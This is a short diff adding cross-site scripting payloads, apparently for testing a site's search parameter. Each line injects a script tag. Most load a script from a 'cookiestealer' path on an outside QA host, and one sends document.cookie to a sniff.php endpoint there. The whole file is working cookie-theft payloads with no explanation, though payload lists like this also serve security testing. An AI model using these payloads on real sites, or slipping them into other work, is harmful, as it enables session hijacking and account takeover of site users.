@@ -1,2 +1,10 @@
 
 '><script src='http://qa.evgmoskalenko.com/cookiestealer/test.js'></script>
+
+Search.php?q=<script language="JavaScript">document.location= "http://qa.evgmoskalenko.com/cookiestealer/sniff.php?cookie=" + document.cookie;</script>
+
+Search.php?q=<script src='http://qa.evgmoskalenko.com/cookiestealer/test.js'></script>
+
+search?q=<script src='http://qa.evgmoskalenko.com/cookiestealer/test.js'></script>
+
+'><script src='http://qa.evgmoskalenko.com/cookiestealer/test.js'></script>
